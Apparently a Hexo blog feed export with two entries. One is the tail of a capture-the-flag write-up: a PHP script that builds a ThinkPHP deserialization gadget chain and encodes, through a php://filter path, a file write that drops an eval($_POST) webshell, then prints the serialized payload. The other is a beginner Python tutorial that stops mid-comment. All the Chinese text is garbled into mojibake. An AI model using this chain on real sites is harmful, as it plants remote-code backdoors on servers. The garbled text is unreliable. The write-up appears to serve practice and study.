Modelæ˜¯æŠ½è±¡ç±»</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = <span class="variable">$output</span>;  <span class="comment">//$this-&gt;parent=&gt; think\console\Output;</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;append = <span class="keyword">array</span>(<span class="string">&quot;xxx&quot;</span>=&gt;<span class="string">&quot;getError&quot;</span>);     <span class="comment">//è°ƒç”¨getError è¿”å›this-&gt;error</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;error = <span class="variable">$modelRelation</span>;               <span class="comment">// $this-&gt;error è¦ä¸º relationç±»çš„å­ç±»ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯OnetoOneç±»çš„å­ç±»==&gt;&gt;HasOne</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::__construct(<span class="variable">$output</span>, <span class="variable">$modelRelation</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">HasOne</span> <span class="title">extends</span> <span class="title">OneToOne</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">OneToOne</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;selfRelation = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;query = <span class="variable">$query</span>;    <span class="comment">//$queryæŒ‡å‘Query</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">&#x27;xxx&#x27;</span>];<span class="comment">// $valueå€¼ï¼Œä½œä¸ºcallå‡½æ•°å¼•ç”¨çš„ç¬¬äºŒå˜é‡</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Query</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$model</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;model = <span class="variable">$model</span>; <span class="comment">//$this-&gt;model=&gt; think\console\Output;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Output</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle =<span class="variable">$handle</span>; <span class="comment">//$handle-&gt;think\session\driver\Memcached</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="variable">$handle</span>; <span class="comment">//$handle-&gt;think\cache\driver\File</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">options</span>=<span class="title">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options=[</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">3600</span>, </span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>, </span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>  =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#x27;</span>, <span class="comment">// $_POST[&#x27;ccc&#x27;]</span></span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tag = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">Memcached</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>(<span class="title">new</span> \<span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>());</span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">new</span> think\console\Output(<span class="variable">$Memcached</span>);</span><br><span class="line">    <span class="variable">$model</span> = <span class="keyword">new</span> think\db\Query(<span class="variable">$Output</span>);</span><br><span class="line">    <span class="variable">$HasOne</span> = <span class="keyword">new</span> think\model\relation\HasOne(<span class="variable">$model</span>);</span><br><span class="line">    <span class="variable">$window</span> = <span class="keyword">new</span> think\process\pipes\Windows(<span class="keyword">new</span> think\model\Pivot(<span class="variable">$Output</span>,<span class="variable">$HasOne</span>));</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$window</span>);</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$window</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>æ²¡æœ‰äººæ¯”æˆ‘æ›´çˆ±å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buuåˆ·é¢˜</tag>
        <tag>å› ä¸ºä¸çŸ¥é“è¯¥å¹²ä»€ä¹ˆæ‰€ä»¥ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>æµ…å­¦äº¿ä¸‹python</title>
    <url>/2022/02/13/%E6%B5%85%E5%AD%A6%E4%BA%BF%E4%B8%8Bpython/</url>
    <content><![CDATA[<h2 id="PYTHON"><a href="#PYTHON" class="headerlink" title="PYTHON"></a>PYTHON</h2><h3 id="1-python"><a href="#1-python" class="headerlink" title="1. python"></a>1. python</h3><p>1.cmdï¼ˆå‘½ä»¤æç¤ºç¬¦ï¼‰ä¸­è¾“å…¥pythonï¼Œè¿›è¡Œç¨‹åºç¼–å†™</p>
<p>2.å£°æ˜ä¸€ä¸ªpythonæ–‡ä»¶ï¼Œç„¶ååœ¨è¯¥ç›®å½•ä¸‹<code>python xx.py</code>æ‰§è¡Œpythonæ–‡ä»¶</p>
<p>3.pycharmç¼–è¯‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello world&quot;</span>)</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h5 id="0x01-pycharmä»¥åŠæ³¨é‡Š"><a href="#0x01-pycharmä»¥åŠæ³¨é‡Š" class="headerlink" title="0x01: pycharmä»¥åŠæ³¨é‡Š"></a>0x01: pycharmä»¥åŠæ³¨é‡Š</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="0x02-æ•°æ®ç±»å‹"><a href="#0x02-æ•°æ®ç±»å‹" class="headerlink" title="0x02: æ•°æ®ç±»å‹"></a>0x02: æ•°æ®ç±»å‹</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æŸ¥è¯¢å˜é‡æ•°æ®ç±»å‹</span></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ•°å­—ï¼ˆintã€floatã€complexã€boolï¼‰</span><br><span class="line"></span><br><span class="line">å­—ç¬¦ä¸²ï¼ˆstrï¼‰</span><br><span class="line"></span><br><span class="line">å­—å…¸ï¼ˆdictï¼‰</span><br><span class="line">a = &#123;&#125;</span><br><span class="line"></span><br><span class="line">å…ƒç»„ï¼ˆTupleï¼‰</span><br><span class="line">b = ()</span><br><span class="line"></span><br><span class="line">åˆ—è¡¨ï¼ˆlistï¼‰</span><br><span class="line">c = []</span><br></pre></td></tr></table></figure>

<p>å˜é‡å‘½åè§„åˆ™å’Œcå·®ä¸å¤š</p>
<p>å‘½åè§„èŒƒ</p>
<h5 id="0x03-pythonåŸºæœ¬è¿ç®—ç¬¦"><a href="#0x03-pythonåŸºæœ¬è¿ç®—ç¬¦" class="headerlink" title="0x03:pythonåŸºæœ¬è¿ç®—ç¬¦"></a>0x03:pythonåŸºæœ¬è¿ç®—ç¬¦</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç®—æœ¯è¿ç®—ç¬¦ï¼š</span><br><span class="line">+ - * / % ** </span><br><span class="line">åœ°æ¿é™¤ï¼š//</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ¯”è¾ƒè¿ç®—ç¬¦ï¼š</span><br><span class="line">== &lt; &gt; &lt;= &gt;= !=</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#é€»è¾‘è¿ç®—ç¬¦ï¼š</span><br><span class="line">#and or not</span><br><span class="line">and æ¡ä»¶å¿…é¡»éƒ½ä¸ºtrueè¿”å›true</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¼˜å…ˆçº§ï¼š</span><br><span class="line">()-&gt;not-&gt;and-&gt;or</span><br></pre></td></tr></table></figure>

<h5 id="0x04"><a href="#0x04" class="headerlink" title="0x04:"></a>0x04:</h5><h5 id="è¾“å…¥ä¸è¾“å‡º"><a href="#è¾“å…¥ä¸è¾“å‡º" class="headerlink" title="è¾“å…¥ä¸è¾“å‡º"></a>è¾“å…¥ä¸è¾“å‡º</h5><p>è¾“å‡ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name = &#x27;å¼ ä¸‰&#x27;</span><br><span class="line">sex = &#x27;male&#x27;</span><br><span class="line">print(&#x27;æˆ‘çš„åå­—æ˜¯%sï¼Œæ˜¯%s&#x27;%(name,sex))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ ¼å¼åŒ–è¾“å‡ºï¼›</span><br><span class="line">ä½¿ç”¨ format</span><br><span class="line">name = &#x27;yuer&#x27;</span><br><span class="line">print(&#x27;name:&#123;&#125;&#x27;.format(name))</span><br></pre></td></tr></table></figure>

<p>è¾“å…¥ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name = input(&#x27;pleast input your name:&#x27;)</span><br></pre></td></tr></table></figure>

<h3 id="2-åˆ¤æ–­è¯­å¥ä¸å¾ªç¯æ§åˆ¶"><a href="#2-åˆ¤æ–­è¯­å¥ä¸å¾ªç¯æ§åˆ¶" class="headerlink" title="2.åˆ¤æ–­è¯­å¥ä¸å¾ªç¯æ§åˆ¶"></a>2.åˆ¤æ–­è¯­å¥ä¸å¾ªç¯æ§åˆ¶</h3><h5 id="0x01-if-elseè¯­å¥"><a href="#0x01-if-elseè¯­å¥" class="headerlink" title="0x01:if-elseè¯­å¥"></a>0x01:if-elseè¯­å¥</h5><p>æµç¨‹ï¼šè®¡ç®—æœºæ‰§è¡Œä»£ç çš„é¡ºåº</p>
<p>æµç¨‹æ§åˆ¶ï¼šå¯¹è®¡ç®—æœºæ‰§è¡Œä»£ç é¡ºåºçš„ç®¡ç†ï¼Œåªæœ‰æµç¨‹æ§åˆ¶æ‰èƒ½å®ç°åœ¨å¼€å‘å½“ä¸­çš„ä¸šåŠ¡é€»è¾‘</p>
<p>æµç¨‹æ§åˆ¶åˆ†ç±»ï¼šé¡ºåºæµç¨‹ã€é€‰æ‹©ï¼ˆåˆ†æ”¯ï¼‰æµç¨‹ã€å¾ªç¯æµç¨‹</p>
<p>é€‰æ‹©æµç¨‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŒåˆ†æ”¯ï¼š</span><br><span class="line">if æ¡ä»¶è¡¨è¾¾å¼:</span><br><span class="line">    â€¦â€¦â€¦â€¦â€¦â€¦</span><br><span class="line">else:</span><br><span class="line">    â€¦â€¦â€¦â€¦â€¦â€¦</span><br><span class="line"></span><br><span class="line">å¤šåˆ†æ”¯ï¼š</span><br><span class="line">if æ¡ä»¶è¡¨è¾¾å¼:</span><br><span class="line">    â€¦â€¦â€¦â€¦â€¦â€¦</span><br><span class="line">elif æ¡ä»¶è¡¨è¾¾å¼:</span><br><span class="line">    â€¦â€¦â€¦â€¦â€¦â€¦</span><br><span class="line">else:</span><br><span class="line">    â€¦â€¦â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure>

<p>æ¡ä»¶è¡¨è¾¾å¼ï¼šæ¯”è¾ƒè¿ç®—ç¬¦/é€»è¾‘è¿ç®—ç¬¦/å¤åˆè¿ç®—ç¬¦</p>
<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = int(input(&quot;è¯·è¾“å…¥æ•°å­—ï¼š&quot;))</span><br><span class="line">if a &gt;= 1:</span><br><span class="line">	print(&quot;true&quot;)</span><br><span class="line">elif a == 0:</span><br><span class="line">	print(&quot;false&quot;)</span><br><span class="line">else:</span><br><span class="line">	print(&quot;a little true&quot;)</span><br></pre></td></tr></table></figure>

<h5 id="0x02-whileå¾ªç¯"><a href="#0x02-whileå¾ªç¯" class="headerlink" title="0x02:whileå¾ªç¯"></a><strong>0x02:whileå¾ªç¯</strong></h5><p>å¾ªç¯æµç¨‹Â·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while æ¡ä»¶è¡¨è¾¾å¼:</span><br><span class="line">	é€»è¾‘ä»£ç </span><br><span class="line">	</span><br><span class="line">for ... in å¯è¿­ä»£é›†åˆå¯¹è±¡:</span><br><span class="line">	é€»è¾‘ä»£ç </span><br></pre></td></tr></table></figure>

<p><strong>whileè¯­æ³•ç‰¹ç‚¹ï¼š</strong></p>
<p>1.å¾ªç¯å¿…é¡»æœ‰ä¸€ä¸ªåˆå§‹å€¼</p>
<p>2.å¿…é¡»æœ‰æ¡ä»¶è¡¨è¾¾å¼</p>
<p>3.è¦æœ‰è‡ªå¢æˆ–è‡ªå‡å˜é‡ï¼Œå¦åˆ™ä¼šæ­»å¾ªç¯</p>
<p>4.å¾ªç¯æ¬¡æ•°ä¸ç¡®å®šï¼Œä¾é å¾ªç¯æ¡ä»¶ç»“æŸ</p>
<p>5.ä¸»è¦ç”¨äºåˆ¤æ–­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while true:</span><br><span class="line">	pythonä»£ç æ®µ</span><br></pre></td></tr></table></figure>

<h5 id="0x03-forå¾ªç¯"><a href="#0x03-forå¾ªç¯" class="headerlink" title="0x03:forå¾ªç¯"></a><strong>0x03:forå¾ªç¯</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ ¼å¼ï¼š</span><br><span class="line">for ä¸´æ—¶å˜é‡ in å­—ç¬¦ä¸²ã€åˆ—è¡¨ç­‰:</span><br><span class="line">	æ‰§è¡Œä»£ç </span><br><span class="line">	â€¦â€¦</span><br></pre></td></tr></table></figure>

<p>è¯­æ³•ç‰¹ç‚¹ï¼š</p>
<p>1.éå†æ“ä½œï¼Œä¾æ¬¡åœ°å–é›†åˆå®¹å™¨ä¸­çš„æ¯ä¸ªå€¼</p>
<p>é€‚ç”¨äºå·²çŸ¥çš„å¾ªç¯æ¬¡æ•°ï¼ˆå¯è¿­ä»£å¯¹è±¡çš„éå†</p>
<p>egï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tags=<span class="string">&#x27;abcdefg&#x27;</span>  <span class="comment">#å­—ç¬¦ä¸²ç±»å‹æœ¬èº«å°±æ˜¯ä¸€ä¸ªå­—ç¬¦ç±»å‹çš„é›†åˆ</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> tags:</span><br><span class="line">	<span class="built_in">print</span>(item)</span><br><span class="line">	<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p><code>rangeå‡½æ•°</code> æ­¤å‡½æ•°å¯ä»¥ç”Ÿæˆä¸€ä¸ªæ•°æ®é›†åˆåˆ—è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rangeå‡½æ•°ä½¿ç”¨ï¼š</span><br><span class="line">range(èµ·å§‹å€¼:ç»“æŸ:æ­¥é•¿) æ­¥é•¿ä¸èƒ½ä¸º0</span><br><span class="line">range(1,100,1)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    <span class="built_in">sum</span> += i</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure>

<p><u>forâ€”else</u></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">k = key</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">if</span> i == k:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;æœªæ‰¾åˆ°key&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line">username = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    zh = <span class="built_in">input</span>(<span class="string">&quot;è´¦å·ï¼š&quot;</span>)</span><br><span class="line">    pd = <span class="built_in">input</span>(<span class="string">&quot;å¯†ç ï¼š&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> zh == username <span class="keyword">and</span> pd == password:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ç™»é™†æˆåŠŸ&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è´¦å·æˆ–è€…å¯†ç é”™è¯¯ï¼Œè¯·é‡æ–°ç™»å½•&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h5 id="0x04-breakã€continue"><a href="#0x04-breakã€continue" class="headerlink" title="0x04:breakã€continue"></a><strong>0x04:breakã€continue</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">breaké€€å‡ºå¾ªç¯</span><br><span class="line">continueè·³è¿‡æœ¬æ¬¡å¾ªç¯ï¼Œç»§ç»­ä¸‹ä¸€æ¬¡å¾ªç¯</span><br></pre></td></tr></table></figure>

<h3 id="3-é«˜çº§æ•°æ®ç±»å‹"><a href="#3-é«˜çº§æ•°æ®ç±»å‹" class="headerlink" title="3.é«˜çº§æ•°æ®ç±»å‹"></a>3.é«˜çº§æ•°æ®ç±»å‹</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åºåˆ—ï¼šä¸€ç»„æŒ‰ç…§é¡ºåºæ’åºçš„å€¼ï¼ˆæ•°æ®é›†åˆ</span><br><span class="line">åœ¨pythonä¸­å­˜åœ¨ä¸‰ç§å†…ç½®çš„åºåˆ—ç±»å‹ï¼šå­—ç¬¦ä¸²ã€åˆ—è¡¨ã€å…ƒç»„</span><br><span class="line"></span><br><span class="line">ä¼˜ç‚¹ï¼šå¯ä»¥æ”¯æŒç´¢å¼•å’Œåˆ‡ç‰‡çš„æ“ä½œ</span><br><span class="line">ç‰¹å¾ï¼šç¬¬ä¸€ä¸ªæ­£ç´¢å¼•ä¸º0ï¼ŒæŒ‡å‘çš„æ˜¯å·¦ç«¯ï¼Œç¬¬ä¸€ä¸ªç´¢å¼•ä¸ºè´Ÿæ•°çš„æ—¶å€™ï¼ŒæŒ‡å‘çš„æ˜¯å³ç«¯</span><br><span class="line"></span><br><span class="line">#åˆ‡ç‰‡æ˜¯æŒ‡æˆªå–å­—ç¬¦ä¸²ä¸­çš„ä»»æ„ä¸€æ®µå†…å®¹ã€‚</span><br><span class="line">#ä½¿ç”¨æ–¹æ³•ï¼š[èµ·å§‹ä¸‹æ ‡:ä»‹ç»ä¸‹æ ‡:æ­¥é•¿]åˆ‡ç‰‡æˆªå–çš„å†…å®¹ä¸åŒ…å«ç»“æŸä¸‹æ ‡å¯¹åº”çš„æ•°æ®ï¼Œæ­¥é•¿æŒ‡çš„æ˜¯éš”å‡ ä¸ªä¸‹æ ‡è·å–ä¸€ä¸ªå­—ç¬¦</span><br><span class="line"></span><br><span class="line">ä¸‹æ ‡ä¼šè¶Šç•Œï¼Œåˆ‡ç‰‡ä¸ä¼š</span><br></pre></td></tr></table></figure>

<h5 id="0x01-å­—ç¬¦ä¸²"><a href="#0x01-å­—ç¬¦ä¸²" class="headerlink" title="0x01:å­—ç¬¦ä¸²"></a>0x01:å­—ç¬¦ä¸²</h5><p><strong>å¸¸ç”¨æ–¹æ³•ï¼š</strong></p>
<table>
<thead>
<tr>
<th align="center">capitalize()</th>
<th align="center">é¦–å­—æ¯å˜å¤§å†™</th>
</tr>
</thead>
<tbody><tr>
<td align="center">endswith()/startswith()</td>
<td align="center">æ˜¯å¦-&gt;ç»“æŸ/å¼€å§‹</td>
</tr>
<tr>
<td align="center">id()</td>
<td align="center">æŸ¥çœ‹å˜é‡å†…å­˜åœ°å€</td>
</tr>
<tr>
<td align="center">find()</td>
<td align="center">æ£€æµ‹xæ˜¯å¦åœ¨å­—ç¬¦ä¸²ä¸­</td>
</tr>
<tr>
<td align="center">index()</td>
<td align="center">æ£€æµ‹xæ˜¯å¦åœ¨å­—ç¬¦ä¸²ä¸­</td>
</tr>
<tr>
<td align="center">isalnum()</td>
<td align="center">åˆ¤æ–­æ˜¯å¦æ˜¯å­—æ¯å’Œæ•°å­—</td>
</tr>
<tr>
<td align="center">isalpha()</td>
<td align="center">åˆ¤æ–­æ˜¯å¦æ˜¯å­—æ¯</td>
</tr>
<tr>
<td align="center">isdigit()</td>
<td align="center">åˆ¤æ–­æ˜¯å¦æ˜¯æ•°å­—</td>
</tr>
<tr>
<td align="center">islower()</td>
<td align="center">åˆ¤æ–­æ˜¯å¦æ˜¯å°å†™</td>
</tr>
<tr>
<td align="center">join()</td>
<td align="center">å¾ªç¯å–å‡ºæ‰€æœ‰å€¼å¾—ç”¨xxå»è¿æ¥</td>
</tr>
<tr>
<td align="center">lower()/upper()</td>
<td align="center">å¤§å°å†™è½¬æ¢</td>
</tr>
<tr>
<td align="center">swapcase()</td>
<td align="center">å¤§å†™å˜å°å†™ï¼Œå°å†™å˜å¤§å†™</td>
</tr>
<tr>
<td align="center">lstrip()/rstrip()/strip()</td>
<td align="center">ç§»é™¤å·¦/å³/ä¸¤ä¾§ç©ºç™½</td>
</tr>
<tr>
<td align="center">split()</td>
<td align="center">åˆ‡å‰²å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">title()</td>
<td align="center">æŠŠæ¯ä¸ªå•è¯çš„é¦–å­—æ¯å˜æˆå¤§å†™</td>
</tr>
<tr>
<td align="center">replace(old,new,count=None)</td>
<td align="center">æ›¿æ¢å­—ç¬¦ï¼Œcountä¸ºæ›¿æ¢ä¸ªæ•°ï¼Œæ— countè¡¨ç¤ºå…¨éƒ¨æ›¿æ¢</td>
</tr>
<tr>
<td align="center">count()</td>
<td align="center">ç»Ÿè®¡å‡ºç°çš„æ¬¡æ•°</td>
</tr>
</tbody></table>
<h6 id="1-å¸¸ç”¨æ–¹æ³•ä½¿ç”¨"><a href="#1-å¸¸ç”¨æ–¹æ³•ä½¿ç”¨" class="headerlink" title="1.å¸¸ç”¨æ–¹æ³•ä½¿ç”¨"></a>1.å¸¸ç”¨æ–¹æ³•ä½¿ç”¨</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#capitalize()</span></span><br><span class="line">name = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;my name is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(name.capitalize()))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;my name is %s&quot;</span>%name.capitalize())</span><br><span class="line"></span><br><span class="line"><span class="comment">#strip()</span></span><br><span class="line">a = <span class="string">&#x27;  yuer  &#x27;</span></span><br><span class="line">b = a.strip()</span><br><span class="line">c = a.lstrip()</span><br><span class="line">d = a.rstrip()</span><br><span class="line"></span><br><span class="line"><span class="comment">#id()</span></span><br><span class="line">a = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">b = a <span class="comment">#å¯¹å†…å­˜åœ°å€è¿›è¡Œå¤åˆ¶</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(b))</span><br><span class="line"></span><br><span class="line"><span class="comment">#find()  index()</span></span><br><span class="line"><span class="comment">#findå¦‚æœæ²¡æœ‰æ‰¾åˆ°å°±è¿”å›-1</span></span><br><span class="line"><span class="comment">#findå¦‚æœæ²¡æœ‰æ‰¾åˆ°å°±ä¼šæŠ¥é”™</span></span><br><span class="line">a = <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a.find(<span class="string">&#x27;o&#x27;</span>))     <span class="comment">#1 ç¬¬ä¸€æ¬¡å‡ºç°çš„ä¸‹æ 